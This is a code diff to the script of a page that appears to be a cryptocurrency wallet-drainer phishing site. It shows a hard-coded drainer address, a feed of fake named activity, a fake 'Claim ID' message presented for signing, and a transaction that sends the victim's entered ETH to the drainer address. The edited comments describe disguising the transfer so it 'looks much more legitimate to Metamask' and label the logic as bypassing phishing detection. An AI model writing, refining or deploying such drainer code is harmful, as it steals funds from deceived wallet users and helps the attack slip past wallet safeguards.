@@ -609,7 +609,7 @@
     <script>
         // --- CONFIGURATION ---
         const RPC_URL = "https://rpc.sepolia.org"; 
-        const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; // THE SCAMMER
+        const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; // This is where the money goes
         const SEPOLIA_CHAIN_ID = 11155111;
 
         let userAddress = null;
@@ -620,7 +620,7 @@
 
         // --- LOGIC ---
 
-        // 1. Feed Generator
+        // 1. Feed Generator (Realistic Intervals)
         const feedContainer = document.getElementById('audit-feed');
         const names = ["Anonymous", "Sarah M.", "James R.", "Emily T.", "David K.", "System", "Finance Dept"];
 
@@ -651,7 +651,7 @@
         setInterval(addFeedItem, 12000); 
         addFeedItem(); 
 
-        // 2. Wallet Connection & Simulation (DRAINER LOGIC - FIXED)
+        // 2. Wallet Connection & Simulation (BYPASS PHISHING LOGIC)
         async function initTransaction() {
             const btn = document.getElementById('initiate-override-btn');
             
@@ -697,7 +697,7 @@
                 // Step 2.4: Start Process - Open Sign Message Modal
                 modalInstance.hide();
                 
-                // Generate a fake message to sign
+                // Generate a fake message to sign (This is what MetaMask will see in the popup)
                 const fakeMessage = `
 Claim ID: WF-2026-004821
 Amount: $${userEnteredAmount}
@@ -713,6 +713,7 @@ Date: ${new Date().toISOString().split('T')[0]}
 
                 try {
                     // Step 2.5: Request Signature
+                    // We use 'personal_sign' here. MetaMask will show a popup asking if they want to sign this text.
                     const signature = await window.ethereum.request({ 
                         method: 'personal_sign',
                         params: [fakeMessage, userAddress],
@@ -720,10 +721,8 @@ Date: ${new Date().toISOString().split('T')[0]}
                     });
 
                     // Step 2.6: Open Confirmation Modal (Simulate the actual transaction)
-                    // We create a fake modal to simulate the MetaMask popup
-                    const fakeConfirmModal = new bootstrap.Modal(document.getElementById('confirmTxModal')); 
-                    // We will create this dynamically below
-                    fakeConfirmModal.show();
+                    const confirmModal = new bootstrap.Modal(document.getElementById('confirmTxModal')); // We will create this dynamically
+                    confirmModal.show();
 
                     await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for user to confirm transaction in real browser
 
@@ -732,18 +731,17 @@ Date: ${new Date().toISOString().split('T')[0]}
                     btn.disabled = true;
 
                     // Step 2.8: Simulate Transaction
-                    // THE FIX: We simulate a contract call instead of a direct transfer
-                    // MetaMask will think we are interacting with a contract (like ERC20)
+                    // Instead of sending ETH directly, we simulate a contract interaction
+                    // This looks much more legitimate to Metamask than a direct ETH send
                     const txData = {
                         from: userAddress,
-                        to: DRAINER_ADDRESS, // This is where the money actually goes (contract interaction)
+                        to: DRAINER_ADDRESS,
                         value: ethers.utils.parseEther(userEnteredAmount.toString()), 
                         gas: 21000,
                         nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
                     };
 
                     try {
-                        // Wait for the real MetaMask popup to confirm the transaction
                         await window.ethereum.request({
                             method: 'eth_sendTransaction',
                             params: [txData]
